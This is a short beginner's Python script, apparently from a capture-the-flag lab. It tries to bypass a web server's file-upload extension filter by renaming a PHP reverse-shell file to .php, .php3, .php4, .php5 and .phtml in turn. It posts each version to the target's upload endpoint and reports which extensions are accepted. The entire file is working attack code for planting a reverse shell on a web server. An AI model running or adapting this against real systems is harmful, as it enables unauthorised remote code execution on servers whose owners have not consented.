# ----------------------------------------------------
# NOTE : this is my first time coding a python code...
# ----------------------------------------------------
import requests
import os

attack_ip = '10.10.23.243'
url = f"http://{attack_ip}:3333/internal/index.php"

old_filename = "php-reverse-shell.php"

filename = "php-reverse-shell"
extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]

for ext in extensions:
    new_filename = filename + ext;
    os.rename(old_filename, new_filename)

    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)
    if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} Seems to be allowed!")
    old_filename = new_filename


# after its done it will rename the file to 
# the allowed extension



# ------------- Python requests upload a file ----------------
# https://stackoverflow.com/
#questions/22567306/python-requests-file-upload
# ------------------------------------------------------------